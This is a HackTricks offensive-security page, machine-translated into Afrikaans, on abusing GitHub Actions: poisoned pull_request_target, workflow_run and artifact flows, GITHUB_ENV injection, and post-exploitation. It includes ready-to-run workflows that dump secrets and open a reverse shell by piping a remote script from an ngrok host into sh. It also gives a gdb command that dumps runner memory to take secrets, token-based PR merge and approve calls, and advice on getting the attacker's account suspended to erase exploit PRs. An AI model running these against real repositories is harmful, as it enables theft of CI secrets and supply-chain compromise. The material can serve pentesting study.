# Misbruik van Github Aksies

<details>

<summary><strong>Leer AWS-hacking van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy jou **maatskappy geadverteer wil sien in HackTricks** of **HackTricks in PDF wil aflaai**, kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** üí¨ [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Deel jou hacktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-repos.

</details>

## Basiese Inligting

Op hierdie bladsy sal jy vind:

* 'n **Opsomming van al die impakte** van 'n aanvaller wat toegang kry tot 'n Github Aksie
* Verskillende maniere om toegang tot 'n aksie te **kry**:
* Om **toestemmings** te h√™ om die aksie te skep
* Misbruik van **pull request** verwante aksies
* Misbruik van **ander eksterne toegang** tegnieke
* **Pivot** vanuit 'n reeds gekompromitteerde bewaarplek
* Uiteindelik, 'n afdeling oor **post-exploitasie tegnieke om 'n aksie van binne af te misbruik** (veroordeel die genoemde impakte)

## Impakte-Opsomming

Vir 'n inleiding oor [**Github Aksies, sien die basiese inligting**](../basic-github-information.md#github-actions).

In die geval dat jy **arbitr√™re Github-aksies/kode kan uitvoer** in 'n **bewaarplek**, kan jy moontlik in staat wees om die volgende te doen:

* **Steel** die **geheime** van daardie bewaarplek/organisasie.
* As jy slegs kan inspuit, kan jy steel wat ook al reeds in die werkstroom aanwesig is.
* Misbruik **bewaarplek-privileges** om toegang tot ander platforms soos AWS en GCP te verkry.
* **Voer kode uit in aangepaste werkers** (as aangepaste werkers gebruik word) en probeer van daar af te pivot.
* **Oorskryf** bewaarplek **kode**.
* Dit hang af van die voorregte van die `GITHUB_TOKEN` (indien enige).
* **Kompromitteer** **implementerings** en ander **artefakte**.
* As die kode iets implementeer of stoor, kan jy dit wysig en verdere toegang verkry.

## GITHUB\_TOKEN

Hierdie "**geheim**" (afkomstig van `${{ secrets.GITHUB_TOKEN }}` en `${{ github.token }}`) word gegee wanneer die admin hierdie opsie aktiveer:

<figure><img src="../../../.gitbook/assets/image (92).png" alt=""><figcaption></figcaption></figure>

Hierdie token is dieselfde een wat 'n **Github-toepassing sal gebruik**, sodat dit toegang kan verkry tot dieselfde eindpunte: [https://docs.github.com/en/rest/overview/endpoints-available-for-github-apps](https://docs.github.com/en/rest/overview/endpoints-available-for-github-apps)

{% hint style="warning" %}
Github moet 'n [**vloei**](https://github.com/github/roadmap/issues/74) vrystel wat **kruisbewaarplek-toegang** binne GitHub toelaat, sodat 'n bewaarplek ander interne bewaarplekke kan benader deur die gebruik van die `GITHUB_TOKEN`.
{% endhint %}

Jy kan die moontlike **toestemmings** van hierdie token sien by: [https://docs.github.com/en/actions/security-guides/automatic-token-authentication#permissions-for-the-github\_token](https://docs.github.com/en/actions/security-guides/automatic-token-authentication#permissions-for-the-github\_token)

Let daarop dat die token **verval nadat die taak voltooi is**.\
Hierdie tokens lyk soos dit: `ghs_veaxARUji7EXszBMbhkr4Nz2dYz0sqkeiur7`

Interessante dinge wat jy met hierdie token kan doen:

{% tabs %}
{% tab title="Voeg PR saam" %}
```bash
# Merge PR
curl -X PUT \
https://api.github.com/repos/<org_name>/<repo_name>/pulls/<pr_number>/merge \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header 'content-type: application/json' \
-d '{"commit_title":"commit_title"}'
```
{% endtab %}

{% tab title="Go to the Actions tab" %}Gaan na die Aksies-vlak.
```bash
# Approve a PR
curl -X POST \
https://api.github.com/repos/<org_name>/<repo_name>/pulls/<pr_number>/reviews \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header 'content-type: application/json' \
-d '{"event":"APPROVE"}'
```
{% endtab %}

{% tab title="Skep PR" %}
```bash
# Create a PR
curl -X POST \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header 'content-type: application/json' \
https://api.github.com/repos/<org_name>/<repo_name>/pulls \
-d '{"head":"<branch_name>","base":"master", "title":"title"}'
```
{% endtab %}
{% endtabs %}

{% hint style="danger" %}
Let daarop dat jy in verskeie gevalle **github-gebruikerstokens binne Github Actions envs of in die geheime** kan vind. Hierdie tokens kan jou meer voorregte gee oor die bewaarplek en organisasie.
{% endhint %}

<details>

<summary>Lys geheime in Github Action-uitset</summary>
```yaml
name: list_env
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
List_env:
runs-on: ubuntu-latest
steps:
- name: List Env
# Need to base64 encode or github will change the secret value for "***"
run: sh -c 'env | grep "secret_" | base64 -w0'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

<details>

<summary>Kry 'n omgekeerde dop met geheime</summary>
```yaml
name: revshell
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
create_pull_request:
runs-on: ubuntu-latest
steps:
- name: Get Rev Shell
run: sh -c 'curl https://reverse-shell.sh/2.tcp.ngrok.io:15217 | sh'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

Dit is moontlik om die toestemmings wat aan 'n Github Token gegee is in ander gebruikers se repositories te kontroleer deur die logs van die aksies te **ondersoek**:

<figure><img src="../../../.gitbook/assets/image (97).png" alt="" width="269"><figcaption></figcaption></figure>

## Toegelate Uitvoering

{% hint style="info" %}
Dit sal die maklikste manier wees om Github aksies te kompromitteer, aangesien hierdie geval veronderstel dat jy toegang het om 'n **nuwe repo in die organisasie te skep**, of skryfregte het oor 'n repository.

As jy in hierdie scenario is, kan jy net die [Post Exploitation tegnieke](./#post-exploitation-techniques-from-inside-an-action) nagaan.
{% endhint %}

### Uitvoering vanaf Repo Skepping

In die geval waar lede van 'n organisasie **nuwe repos kan skep** en jy github aksies kan uitvoer, kan jy 'n **nuwe repo skep en die geheime wat op organisasievlak ingestel is, steel**.

### Uitvoering vanaf 'n Nuwe Tak

As jy 'n **nuwe tak kan skep in 'n repository wat reeds 'n Github Aksie** gekonfigureer het, kan jy dit **verander**, die inhoud **oplaai**, en dan **daardie aksie vanaf die nuwe tak uitvoer**. Op hierdie manier kan jy die geheime van die repository en organisasievlak **uitlees** (maar jy moet weet hoe hulle genoem word).

Jy kan die gewysigde aksie **handmatig** uitvoer, wanneer 'n **PR geskep word**, of wanneer **sekere kode gestuur word** (afhangende van hoe opvallend jy wil wees):
```yaml
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- master
push: # Run it when a push is made to a branch
branches:
- current_branch_name

# Use '**' instead of a branh name to trigger the action in all the cranches
```
***

## Gevorkte Uitvoering

{% hint style="info" %}
Daar is verskillende aksies wat 'n aanvaller kan toelaat om **'n Github Aksie van 'n ander bewaarplek uit te voer**. As daardie aksies swak gekonfigureer is, kan 'n aanvaller hulle moontlik benadeel.
{% endhint %}

### `pull_request`

Die werkstroomtrigger **`pull_request`** sal die werkstroom elke keer uitvoer as 'n pull-aanvraag ontvang word, met 'n paar uitsonderings: as dit die **eerste keer** is wat jy **saamwerk**, sal 'n **onderhouer** die **uitvoering** van die werkstroom moet **goedkeur**:

<figure><img src="../../../.gitbook/assets/image (4) (2).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
Aangesien die **standaard beperking** vir **eerste keer** bydraers is, kan jy bydra deur 'n geldige fout/tikfout te **herstel** en dan **ander PR's stuur om jou nuwe `pull_request`-voorregte te misbruik**.

**Ek het dit getoets en dit werk nie**: ~~'n Ander opsie sou wees om 'n rekening te skep met die naam van iemand wat bygedra het tot die projek en sy rekening verwyder het.~~
{% endhint %}

Verder voorkom dit standaard **skryftoestemmings** en **geheime toegang** tot die teikengewaarplek soos genoem in die [**dokumentasie**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#workflows-in-forked-repositories):

> Met die uitsondering van `GITHUB_TOKEN`, **word geheime nie aan die loper oorgedra** wanneer 'n werkstroom van 'n **gevorkte** bewaarplek af geaktiveer word nie. Die **`GITHUB_TOKEN` het slegs leestoegang** in pull-aanvrae **van gevorkte bewaarplekke**.

'n Aanvaller kan die definisie van die Github Aksie wysig om arbitr√™re dinge uit te voer en arbitr√™re aksies by te voeg. Hy sal egter nie in staat wees om geheime te steel of die bewaarplek te oorskryf nie as gevolg van die genoemde beperkings.

{% hint style="danger" %}
**Ja, as die aanvaller in die PR die github aksie wat geaktiveer sal word, verander, sal sy Github Aksie die een wees wat gebruik word en nie die een van die oorspronklike bewaarplek nie!**
{% endhint %}

Aangesien die aanvaller ook die uitgevoerde kode beheer, selfs al is daar nie geheime of skryftoestemmings op die `GITHUB_TOKEN` nie, kan 'n aanvaller byvoorbeeld **skadelike artefakte oplaai**.

### **`pull_request_target`**

Die werkstroomtrigger **`pull_request_target`** het **skryftoestemming** tot die teikengewaarplek en **toegang tot geheime** (en vra nie vir toestemming nie).

Let daarop dat die werkstroomtrigger **`pull_request_target`** in die basis-konteks **uitgevoer word** en nie in die een wat deur die PR gegee word (om **onbetroubare kode nie uit te voer nie**). Vir meer inligting oor `pull_request_target` [**kyk na die dokumentasie**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#pull\_request\_target).\
Verder, vir meer inligting oor hierdie spesifieke gevaarlike gebruik, kyk na hierdie [**github blogpos**](https://securitylab.github.com/research/github-actions-preventing-pwn-requests/).

Dit mag dalk lyk asof die **uitgevoerde werkstroom** die een is wat in die **basis** gedefinieer is en nie in die PR nie, dit is **veilig** om **`pull_request_target`** te gebruik, maar daar is 'n **paar gevalle waar dit nie** is nie.

En hierdie een sal **toegang tot geheime** h√™.

### `workflow_run`

Die [**workflow\_run**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#workflow\_run) trigger maak dit moontlik om 'n werkstroom van 'n ander een uit te voer wanneer dit `voltooi`, `aangevra` of `in_progress` is.

In hierdie voorbeeld is 'n werkstroom gekonfigureer om uit te voer nadat die afsonderlike "Run Tests" werkstroom voltooi is:
```yaml
on:
workflow_run:
workflows: [Run Tests]
types:
- completed
```
Verder, volgens die dokumentasie: Die werkstroom wat begin word deur die `workflow_run` gebeurtenis kan **geheime toegang en tokens skryf, selfs as die vorige werkstroom nie** kon nie.

Hierdie tipe werkstroom kan aangeval word as dit afhang van 'n werkstroom wat deur 'n eksterne gebruiker geaktiveer kan word via 'n `pull_request` of `pull_request_target`. 'n Paar kwesbare voorbeelde kan [**in hierdie blog gevind word**](https://www.legitsecurity.com/blog/github-privilege-escalation-vulnerability)**.** Die eerste een bestaan uit die **`workflow_run`** geaktiveerde werkstroom wat die aanvaller se kode aflaai: `${{ github.event.pull_request.head.sha }}`\
Die tweede een bestaan uit die **oorhandiging** van 'n **artefak** van die **onbetroubare** kode na die **`workflow_run`** werkstroom en die gebruik van die inhoud van hierdie artefak op 'n manier wat dit **kwesbaar maak vir RCE**.

### `workflow_call`

TODO

TODO: Kyk of wanneer dit uitgevoer word vanaf 'n pull\_request die gebruikte/aflaai kode die een van die oorsprong of die gevorkte PR is

## Misbruik van gevorkte uitvoering

Ons het al die maniere genoem waarop 'n eksterne aanvaller 'n GitHub-werkstroom kan laat uitvoer, laat ons nou kyk hoe hierdie uitvoerings, as dit sleg gekonfigureer is, misbruik kan word:

### Onbetroubare uitvoering van checkout

In die geval van **`pull_request`,** sal die werkstroom uitgevoer word in die **konteks van die PR** (so dit sal die **kwaadwillige PR se kode** uitvoer), maar iemand moet dit **eerstens magtig** en dit sal met 'n paar [beperkings](./#pull\_request) uitgevoer word.

In die geval van 'n werkstroom wat **`pull_request_target` of `workflow_run`** gebruik en afhang van 'n werkstroom wat geaktiveer kan word vanaf **`pull_request_target` of `pull_request`**, sal die kode van die oorspronklike bewaarplek uitgevoer word, sodat die **aanvaller nie die uitgevoerde kode kan beheer nie**.

{% hint style="danger" %}
As die **aksie** egter 'n **uitdruklike PR checkout** het wat die kode van die PR sal **kry** (en nie van die basis nie), sal dit die aanvaller se beheerde kode gebruik. Byvoorbeeld (kyk na lyn 12 waar die PR-kode afgelaai word):
{% endhint %}

<pre class="language-yaml"><code class="lang-yaml"># ONVEILIG. Slegs as voorbeeld verskaf.
on:
pull_request_target

jobs:
build:
name: Bou en toets
runs-on: ubuntu-latest
steps:
<strong>    - uses: actions/checkout@v2
</strong><strong>      with:
</strong><strong>        ref: ${{ github.event.pull_request.head.sha }}
</strong>
- uses: actions/setup-node@v1
- run: |
npm install
npm build

- uses: completely/fakeaction@v2
with:
arg1: ${{ secrets.supersecret }}

- uses: fakerepo/comment-on-pr@v1
with:
message: |
Dankie!
</code></pre>

Die potensieel **onbetroubare kode word uitgevoer tydens `npm install` of `npm build`** aangesien die bou-skripte en verwysde **pakette beheer word deur die outeur van die PR**.

{% hint style="warning" %}
'n GitHub-dork om te soek na kwesbare aksies is: `event.pull_request pull_request_target extension:yml`, daar is egter verskillende maniere om die take veilig te laat uitvoer, selfs as die aksie onveilig gekonfigureer is (soos die gebruik van voorwaardes oor wie die aktor is wat die PR genereer).
{% endhint %}

### Konteksskripsinjeksies <a href="#understanding-the-risk-of-script-injections" id="understanding-the-risk-of-script-injections"></a>

Let daarop dat daar sekere [**github-kontekste**](https://docs.github.com/en/actions/reference/context-and-expression-syntax-for-github-actions#github-context) is waarvan die waardes deur die gebruiker wat die PR skep, **beheer word**. As die GitHub-aksie daardie **data gebruik om iets uit te voer**, kan dit lei tot **arbitr√™re kode-uitvoering**:

{% content-ref url="gh-actions-context-script-injections.md" %}
[gh-actions-context-script-injections.md](gh-actions-context-script-injections.md)
{% endcontent-ref %}

### **GITHUB\_ENV Skripsinjeksie** <a href="#what-is-usdgithub_env" id="what-is-usdgithub_env"></a>

Volgens die dokumentasie: U kan 'n **omgewingsveranderlike beskikbaar maak vir enige volgende stappe** in 'n werkstroomtaak deur die omgewingsveranderlike te definieer of by te werk en dit na die **`GITHUB_ENV`**-omgewingsl√™er te skryf.

As 'n aanvaller enige waarde in hierdie **omgewingsveranderlike kan inspuit**, kan hy omgewingsveranderlikes inspuit wat kode in volgende stappe kan uitvoer, soos **LD\_PRELOAD** of **NODE\_OPTIONS**.

Byvoorbeeld ([**hierdie**](https://www.legitsecurity.com/blog/github-privilege-escalation-vulnerability-0) en [**hierdie**](https://www.legitsecurity.com/blog/-how-we-found-another-github-action-environment-injection-vulnerability-in-a-google-project)), stel u 'n werkstroom voor wat 'n opgelaaide artefak vertrou om sy inhoud binne die **`GITHUB_ENV`**-omgewingsveranderlike te stoor. 'n Aanvaller kan iets soos dit oplaai om dit te kompromitteer:

<figure><img src="../../../.gitbook/assets/image (3) (2).png" alt=""><figcaption></figcaption></figure>

### Kwesbare Derde Party Github Aksies

#### [dawidd6/action-download-artifact](https://github.com/dawidd6/action-download-artifact)

Soos genoem in [**hierdie blogpos**](https://www.legitsecurity.com/blog/github-actions-that-open-the-door-to-cicd-pipeline-attacks), maak hierdie Github-aksie dit moontlik om artefakte van verskillende werkstrome en selfs bewaarplekke te ontsluit.

Die probleem is dat as die **`path`**-parameter nie ingestel is nie, die artefak in die huidige gids uitgepak word en dit l√™ers kan oorskryf wat later in die werkstroom gebruik kan word of selfs uitgevoer kan word. Daarom kan 'n aanvaller, as die Artefak kwesbaar is, dit misbruik om ander werkstrome wat die Artefak vertrou, te kompromitteer.

Voorbeeld van 'n kwesbare werkstroom:
```yaml
on:
workflow_run:
workflows: ["some workflow"]
types:
- completed

jobs:
success:
runs-on: ubuntu-latest
steps:
- uses: actions/checkout@v2
- name: download artifact
uses: dawidd6/action-download-artifact
with:
workflow: ${{ github.event.workflow_run.workflow_id }}
name: artifact
- run: python ./script.py
with:
name: artifact
path: ./script.py
```
Hierdie kan aangeval word met hierdie werkstroom:
```yaml
name: "some workflow"
on: pull_request

jobs:
upload:
runs-on: ubuntu-latest
steps:
- run: echo "print('exploited')" > ./script.py
- uses actions/upload-artifact@v2
with:
name: artifact
path: ./script.py
```
***

## Ander Eksterne Toegang

### Verwyderde Naamruimte Repo Oorname

As 'n rekening sy naam verander, kan 'n ander gebruiker 'n rekening met daardie naam registreer na 'n tydperk. As 'n argief **minder as 100 sterre gehad het voordat die naam verander is**, sal Github die nuwe geregistreerde gebruiker met dieselfde naam toelaat om 'n **argief met dieselfde naam** as die verwyderde een te skep.

{% hint style="danger" %}
Dus, as 'n aksie 'n argief gebruik van 'n nie-bestaande rekening, is dit steeds moontlik dat 'n aanvaller daardie rekening kan skep en die aksie kan benadeel.
{% endhint %}

As ander argiewe **afhanklikhede van hierdie gebruikersargiewe gebruik**, sal 'n aanvaller hulle kan oorneem. Hier het jy 'n meer volledige verduideliking: [https://blog.nietaanraken.nl/posts/gitub-popular-repository-namespace-retirement-bypass/](https://blog.nietaanraken.nl/posts/gitub-popular-repository-namespace-retirement-bypass/)

***

## Argief Pivoting

{% hint style="info" %}
In hierdie gedeelte sal ons praat oor tegnieke wat sou toelaat om **van die een argief na die ander te beweeg**, veronderstel dat ons enige soort toegang het tot die eerste een (kyk na die vorige gedeelte).
{% endhint %}

### Kassie Vergiftiging

'n Kassie word behou tussen **werkstroom uitvoerings in dieselfde tak**. Dit beteken dat as 'n aanvaller 'n **pakket benadeel** wat dan in die kassie gestoor word en deur 'n **meer bevoorregte** werkstroom afgelaai en uitgevoer word, sal hy ook daardie werkstroom kan **benadeel**.

{% content-ref url="gh-actions-cache-poisoning.md" %}
[gh-actions-cache-poisoning.md](gh-actions-cache-poisoning.md)
{% endcontent-ref %}

### Argief Vergiftiging

Werkstrome kan **argiewe van ander werkstrome en selfs argiewe** gebruik, as 'n aanvaller daarin slaag om die Github Aksie wat 'n argief **oplaai** te **benadeel** wat later deur 'n ander werkstroom gebruik word, kan hy die ander werkstrome **benadeel**:

{% content-ref url="gh-actions-artifact-poisoning.md" %}
[gh-actions-artifact-poisoning.md](gh-actions-artifact-poisoning.md)
{% endcontent-ref %}

***

## Post Exploitation vanuit 'n Aksie

### Toegang tot AWS en GCP via OIDC

Kyk na die volgende bladsye:

{% content-ref url="../../../pentesting-cloud/aws-security/aws-basic-information/aws-federation-abuse.md" %}
[aws-federation-abuse.md](../../../pentesting-cloud/aws-security/aws-basic-information/aws-federation-abuse.md)
{% endcontent-ref %}

{% content-ref url="../../../pentesting-cloud/gcp-security/gcp-basic-information/gcp-federation-abuse.md" %}
[gcp-federation-abuse.md](../../../pentesting-cloud/gcp-security/gcp-basic-information/gcp-federation-abuse.md)
{% endcontent-ref %}

### Toegang tot geheime <a href="#accessing-secrets" id="accessing-secrets"></a>

As jy inhoud in 'n skripsie inspuit, is dit interessant om te weet hoe jy toegang kan verkry tot geheime:

* As die geheim of token ingestel is as 'n **omgewingsveranderlike**, kan dit direk toegang verkry word deur die omgewing te gebruik met behulp van **`printenv`**.

<details>

<summary>Lys geheime in Github Aksie-uitset</summary>
```yaml
name: list_env
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
List_env:
runs-on: ubuntu-latest
steps:
- name: List Env
# Need to base64 encode or github will change the secret value for "***"
run: sh -c 'env | grep "secret_" | base64 -w0'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}

secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

<details>

<summary>Kry 'n omgekeerde dop met geheime</summary>
```yaml
name: revshell
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
create_pull_request:
runs-on: ubuntu-latest
steps:
- name: Get Rev Shell
run: sh -c 'curl https://reverse-shell.sh/2.tcp.ngrok.io:15217 | sh'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

* As die geheim direk in 'n uitdrukking gebruik word, word die gegenereerde skript op die skyf gestoor en is dit toeganklik.
* ```bash
cat /home/runner/work/_temp/*
```
* Vir 'n JavaScript-aksie word die geheime deur omgewingsveranderlikes gestuur.
* ```bash
ps axe | grep node
```
* Vir 'n aangepaste aksie kan die risiko wissel afhangende van hoe 'n program die geheim gebruik wat dit uit die argument verkry het:

```yaml
uses: fakeaction/publish@v3
with:
key: ${{ secrets.PUBLISH_KEY }}
```

### Misbruik van self-gehoste runners

Die manier om te vind watter Github-aksies in nie-Github-infrastruktuur uitgevoer word, is om te soek na **`runs-on: self-hosted`** in die Github-aksie-konfigurasie-yaml.

Self-gehoste runners mag toegang h√™ tot ekstra sensitiewe inligting, tot ander netwerksisteme (kwesbare eindpunte in die netwerk? metadata-diens?) of, selfs al is dit ge√Øsoleer en vernietig, kan meer as een aksie gelyktydig uitgevoer word en die kwaadwillige aksie kan die geheime van die ander steel.

In self-gehoste runners is dit ook moontlik om die geheime van die **_Runner.Listener_**-proses te verkry wat al die geheime van die werkstrome in enige stap bevat deur sy geheue te dump:

{% code overflow="wrap" %}
```bash
sudo apt-get install -y gdb
sudo gcore -o k.dump "$(ps ax | grep 'Runner.Listener' | head -n 1 | awk '{ print $1 }')"
```
{% endcode %}

Kyk [**hierdie pos vir meer inligting**](https://karimrahal.com/2023/01/05/github-actions-leaking-secrets/).

### Github Docker Beelderegister

Dit is moontlik om Github-aksies te maak wat 'n Docker-beeld binne Github sal **bou en stoor**.\
'n Voorbeeld kan gevind word in die volgende uitvou:

<details>

<summary>Github Aksie Bou &#x26; Stoor Docker Beeld</summary>
```yaml
[...]

- name: Set up Docker Buildx
uses: docker/setup-buildx-action@v1

- name: Login to GitHub Container Registry
uses: docker/login-action@v1
with:
registry: ghcr.io
username: ${{ github.repository_owner }}
password: ${{ secrets.ACTIONS_TOKEN }}

- name: Add Github Token to Dockerfile to be able to download code
run: |
sed -i -e 's/TOKEN=##VALUE##/TOKEN=${{ secrets.ACTIONS_TOKEN }}/g' Dockerfile

- name: Build and push
uses: docker/build-push-action@v2
with:
context: .
push: true
tags: |
ghcr.io/${{ github.repository_owner }}/${{ github.event.repository.name }}:latest
ghcr.io/${{ github.repository_owner }}/${{ github.event.repository.name }}:${{ env.GITHUB_NEWXREF }}-${{ github.sha }}

[...]
```
</details>

Soos jy kon sien in die vorige kode, word die Github-register gehuisves in **`ghcr.io`**.

'n Gebruiker met leesregte oor die repo sal dan in staat wees om die Docker-beeld af te laai deur 'n persoonlike toegangstoken te gebruik:
```bash
echo $gh_token | docker login ghcr.io -u <username> --password-stdin
docker pull ghcr.io/<org-name>/<repo_name>:<tag>
```
Dan kan die gebruiker soek na **gelekte geheime in die Docker-beeldlae:**

{% embed url="https://book.hacktricks.xyz/generic-methodologies-and-resources/basic-forensic-methodology/docker-forensics" %}

### Sensitiewe inligting in Github Actions-logboeke

Selfs al probeer **Github** om **geheime waardes op te spoor** in die aksie-logboeke en dit **nie te wys nie**, sal **ander sensitiewe data** wat gegenereer kon word tydens die uitvoering van die aksie nie weggesteek word nie. Byvoorbeeld, 'n JWT wat onderteken is met 'n geheime waarde sal nie weggesteek word tensy dit [spesifiek gekonfigureer](https://github.com/actions/toolkit/tree/main/packages/core#setting-a-secret) is nie.

## Om jou spoor te verberg

(Tegniek van [**hier**](https://divyanshu-mehta.gitbook.io/researchs/hijacking-cloud-ci-cd-systems-for-fun-and-profit)) Eerstens is enige PR wat ingedien word duidelik sigbaar vir die publiek op Github en vir die teiken-GitHub-rekening. In GitHub kan ons standaard **nie 'n PR van die internet af verwyder nie**, maar daar is 'n draai. Vir Github-rekeninge wat deur Github **geskors** is, word al hul **PR's outomaties verwyder** en van die internet afgehaal. Om jou aktiwiteit te verberg, moet jy dus jou **GitHub-rekening laat skors of jou rekening laat merk**. Dit sal al jou aktiwiteite op GitHub van die internet verberg (basies al jou uitbuit-PR's verwyder).

'n Organisasie op GitHub is baie proaktief om rekeninge aan GitHub te rapporteer. Al wat jy hoef te doen is "iets" deel in 'n probleem en hulle sal verseker dat jou rekening binne 12 uur geskors word :p en daar het jy dit, jou uitbuiting is onsigbaar op github.

{% hint style="warning" %}
Die enigste manier vir 'n organisasie om uit te vind dat hulle geteiken is, is om GitHub-logboeke van SIEM te kontroleer, aangesien die PR vanaf die GitHub-gebruikerskoppelvlak verwyder sal word.
{% endhint %}

<details>

<summary><strong>Leer AWS-hacking van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy wil sien dat jou **maatskappy geadverteer word in HackTricks** of **HackTricks aflaai in PDF-formaat**, kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks-uitrusting**](https://peass.creator-spring.com)
* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFT's**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** üí¨ [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Deel jou haktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslagplekke.

</details>
